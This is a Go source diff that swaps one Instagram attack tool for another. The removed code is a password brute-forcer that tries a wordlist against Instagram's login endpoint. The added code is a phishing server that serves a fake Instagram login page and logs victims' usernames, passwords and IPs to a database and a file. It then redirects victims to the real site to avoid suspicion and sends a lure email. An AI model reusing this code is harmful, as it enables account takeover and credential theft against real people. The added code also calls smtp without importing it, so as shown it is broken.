@@ -1,183 +1,169 @@
 package main
 
 import (
-	"bufio"
-	"fmt"
-	"io"
-	"net/http"
-	"net/url"
-	"os"
-	"strings"
-	"time"
+    "database/sql"
+    "fmt"
+    "html/template"
+    "log"
+    "net/http"
+    "os"
+    "time"
+
+    "github.com/google/uuid"
+    "github.com/jordan-wright/email"
+    _ "github.com/mattn/go-sqlite3"
 )
 
-// --- Configuration Section ---
-const (
-	// Login URL (the same AJAX endpoint you were using before)
-	loginURL = "https://www.instagram.com/accounts/login/ajax/"
-
-	// Form field names
-	usernameField    = "username"
-	passwordField    = "enc_password" // Note: The encryption prefix is still hardcoded in the tryPassword function
-	optIntoOneTap    = "optIntoOneTap"
-	queryParams      = "queryParams"
-	trustedDeviceRec = "trustedDeviceRecords"
-	loginAttemptCount = "loginAttemptCount"
-	isPrivacyPortalReq = "isPrivacyPortalReq"
-
-	// File containing passwords
-	passwordsFile = "password.txt"
-
-	// Delay between attempts (in seconds)
-	retryDelaySeconds = 2
-)
-
-// HTTP Headers (some values are examples or may need dynamic generation)
-// Important Note: Hardcoded tokens like CSRFToken and cookies will likely cause issues
-// as they are session-specific and expire. This is a major limitation.
-var defaultHeaders = map[string]string{
-	"User-Agent":       "Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743)",
-	"X-CSRFToken":      "z2y86ITZAahahOfRghvrCF3PlUj4wx8N", // Example: This should be dynamic
-	"X-Instagram-AJAX": "1023134472",                     // Example: This might change
-	"X-Requested-With": "XMLHttpRequest",
-	"Referer":          "https://www.instagram.com/accounts/login/",
-	"Origin":           "https://www.instagram.com",
-	"Content-Type":     "application/x-www-form-urlencoded",
-	"X-IG-App-ID":      "936619743392459",                    // Example: This might change
-	"X-IG-WWW-Claim":   "hmac.AR0yguz-o9CzH6COPm6FWASXsTwt-9uGK8POXdrEwr7UYcqC", // Example: This should be dynamic
-	"Cookie":           `csrftoken=z2y86ITZAahahOfRghvrCF3PlUj4wx8N; mid=aDCkugALAAE0mwBUT4-2EUrl5ufw; ig_did=1E68718D-4352-40B7-AEFF-BBEDAD4A4091; rur="VLL,50771762250,1779555557:01f7212..."`, // Example: These are session-specific
+// LoginData struct to store form data
+type LoginData struct {
+    ID        int
+    Username  string
+    Password  string
+    IP        string
+    UserAgent string
+    Timestamp string
+    SessionID string
 }
 
-// Debug Mode
-// If true, more detailed logs will be displayed. Set to false for less output.
-var debugMode = true
-// --- End of Configuration Section ---
-
-func tryPassword(username, password string) bool {
-	data := url.Values{}
-	// Note: The #PWD_INSTAGRAM_BROWSER:10:<timestamp>:<password> encryption format
-	// is specific, and the timestamp here is static. This is a significant limitation.
-	data.Set(passwordField, "#PWD_INSTAGRAM_BROWSER:10:1748019955:"+password)
-	data.Set(usernameField, username)
-	data.Set(optIntoOneTap, "false")
-	data.Set(queryParams, "{}")
-	data.Set(trustedDeviceRec, "{}")
-	data.Set(loginAttemptCount, "0")
-    data.Set(isPrivacyPortalReq, "false")
-
-	client := &http.Client{
-		Timeout: 30 * time.Second, // A timeout was added for the client
-	}
-	req, err := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
-	if err != nil {
-		if debugMode {
-			fmt.Println("Error creating request:", err)
-		}
-		return false
-	}
-
-	// Set headers from the configuration
-	for key, value := range defaultHeaders {
-		req.Header.Set(key, value)
-	}
-
-	if debugMode {
-		fmt.Println("\n--- Attempting password:", password, "---")
-		fmt.Println("Sending request to:", loginURL)
-		// fmt.Println("With form data:", data.Encode()) // Displaying form data might be verbose
-		fmt.Println("With headers:")
-		for key, values := range req.Header {
-			fmt.Printf("  %s: %s\n", key, strings.Join(values, ", "))
-		}
-	}
-
-	resp, err := client.Do(req)
-	if err != nil {
-		if debugMode {
-			fmt.Println("Error sending request:", err)
-		}
-		return false
-	}
-	defer resp.Body.Close()
-
-	bodyBytes, err := io.ReadAll(resp.Body)
-	if err != nil {
-		if debugMode {
-			fmt.Println("Error reading response:", err)
-		}
-		return false
-	}
-	body := string(bodyBytes)
-
-	if debugMode {
-		fmt.Println("Response status:", resp.StatusCode)
-		fmt.Println("Response body:", body)
-	}
-
-	// Your original success condition
-	if resp.StatusCode == 200 && strings.Contains(body, `"authenticated":true`) {
-		return true
-	}
-
-	// Additional check for security challenge for more clarity in debug mode
-	if strings.Contains(body, `"challenge_required"`) || resp.StatusCode == 400 {
-		if debugMode {
-			fmt.Println("!!! Warning: Security challenge detected by Instagram or bad request (Code: ", resp.StatusCode, ") !!!")
-		}
-	}
-    if resp.StatusCode == 404 {
-        if debugMode {
-            fmt.Println("!!! Warning: Target URL (", loginURL, ") not found (404) !!!")
-        }
-    }
-
-	return false
-}
+// HTML template for fake Instagram login page
+const loginTemplate = `
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram Login</title>
+    <style>
+        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #fafafa; }
+        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.1); width: 350px; text-align: center; }
+        h2 { color: #262626; font-size: 24px; margin-bottom: 20px; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 14px; }
+        input[type="submit"] { background: #0095f6; color: white; padding: 12px; border: none; border-radius: 5px; cursor: pointer; width: 100%; font-size: 16px; }
+        input[type="submit"]:hover { background: #0074cc; }
+        .error { color: red; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Instagram Login</h2>
+        <form action="/login" method="POST">
+            <input type="hidden" name="csrf_token" value="{{.CSRFToken}}">
+            <input type="text" name="username" placeholder="Username" required><br>
+            <input type="password" name="password" placeholder="Password" required><br>
+            <input type="submit" value="Log In">
+        </form>
+    </div>
+</body>
+</html>
+`
 
 func main() {
-	fmt.Print("Enter username: ")
-	var username string
-	fmt.Scanln(&username)
-
-	file, err := os.Open(passwordsFile)
-	if err != nil {
-		fmt.Println("Error opening passwords file (", passwordsFile, "):", err)
-		return
-	}
-	defer file.Close()
-
-	if debugMode {
-		fmt.Println("Starting to read passwords from file:", passwordsFile)
-	}
-
-	scanner := bufio.NewScanner(file)
-	passwordFound := false
-	for scanner.Scan() {
-		password := scanner.Text()
-		if password == "" { // Skip empty lines
-			continue
-		}
-
-		fmt.Println("\nAttempting password:", password) // This main message remains
-
-		if tryPassword(username, password) {
-			fmt.Println("\n******************************")
-			fmt.Println("      Password found:", password)
-			fmt.Println("******************************")
-			passwordFound = true
-			break
-		}
-		if debugMode {
-			fmt.Println("--- End of attempt for password:", password, "---")
-		}
-		time.Sleep(retryDelaySeconds * time.Second)
-	}
-
-	if err := scanner.Err(); err != nil {
-		fmt.Println("Error reading passwords file:", err)
-	}
-
-	if !passwordFound {
-        fmt.Println("\nFinished processing passwords file. No password was found.")
+    // Initialize SQLite database
+    db, err := sql.Open("sqlite3", "./phishing_log.db")
+    if err != nil {
+        log.Fatal("Error connecting to database:", err)
     }
+    defer db.Close()
+
+    // Create table for storing login attempts
+    _, err = db.Exec(`
+        CREATE TABLE IF NOT EXISTS logins (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username TEXT,
+            password TEXT,
+            ip TEXT,
+            user_agent TEXT,
+            timestamp TEXT,
+            session_id TEXT
+        )`)
+    if err != nil {
+        log.Fatal("Error creating table:", err)
+    }
+
+    // Initialize log file
+    logFile, err := os.OpenFile("phishing_attempts.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+    if err != nil {
+        log.Fatal("Error opening log file:", err)
+    }
+    defer logFile.Close()
+    logger := log.New(logFile, "PHISHING: ", log.LstdFlags)
+
+    // Define routes
+    http.HandleFunc("/", loginPage)
+    http.HandleFunc("/login", handleLogin(db, logger))
+
+    // Start server
+    fmt.Println("Server running on port 8080...")
+    log.Fatal(http.ListenAndServe(":8080", nil))
+}
+
+// loginPage handles the display of the fake login page
+func loginPage(w http.ResponseWriter, r *http.Request) {
+    t, err := template.New("login").Parse(loginTemplate)
+    if err != nil {
+        http.Error(w, "Error loading page", http.StatusInternalServerError)
+        return
+    }
+
+    // Generate CSRF token (simulated for realism)
+    csrfToken := uuid.New().String()
+    data := struct {
+        CSRFToken string
+    }{CSRFToken: csrfToken}
+
+    t.Execute(w, data)
+}
+
+// handleLogin processes form submissions
+func handleLogin(db *sql.DB, logger *log.Logger) http.HandlerFunc {
+    return func(w http.ResponseWriter, r *http.Request) {
+        if r.Method != http.MethodPost {
+            http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+            return
+        }
+
+        // Parse form data
+        username := r.FormValue("username")
+        password := r.FormValue("password")
+        ip := r.RemoteAddr
+        userAgent := r.UserAgent()
+        timestamp := time.Now().Format(time.RFC3339)
+        sessionID := uuid.New().String()
+
+        // Log to file
+        logger.Printf("Username: %s, Password: %s, IP: %s, User-Agent: %s, SessionID: %s", username, password, ip, userAgent, sessionID)
+
+        // Store in database
+        _, err := db.Exec(
+            "INSERT INTO logins (username, password, ip, user_agent, timestamp, session_id) VALUES (?, ?, ?, ?, ?, ?)",
+            username, password, ip, userAgent, timestamp, sessionID)
+        if err != nil {
+            logger.Println("Error storing data:", err)
+            http.Error(w, "Server error", http.StatusInternalServerError)
+            return
+        }
+
+        // Send phishing email (simulated)
+        err = sendPhishingEmail(username)
+        if err != nil {
+            logger.Println("Error sending email:", err)
+        }
+
+        // Redirect to real Instagram to avoid suspicion
+        http.Redirect(w, r, "https://www.instagram.com", http.StatusFound)
+    }
+}
+
+// sendPhishingEmail sends a fake phishing email
+func sendPhishingEmail(username string) error {
+    e := email.NewEmail()
+    e.From = "no-reply@fake-instagram.com"
+    e.To = []string{username + "@example.com"} // Replace with real email in controlled tests
+    e.Subject = "Security Alert: Suspicious Login Attempt"
+    e.Text = []byte("Someone tried to log into your Instagram account. Click here to verify your identity: http://fake-instagram.com/verify")
+
+    // SMTP configuration (replace with your SMTP server details)
+    err := e.Send("smtp.gmail.com:587", smtp.PlainAuth("", "your-email@gmail.com", "your-app-password", "smtp.gmail.com"))
+    if err != nil {
+        return err
+    }
+    return nil
 }
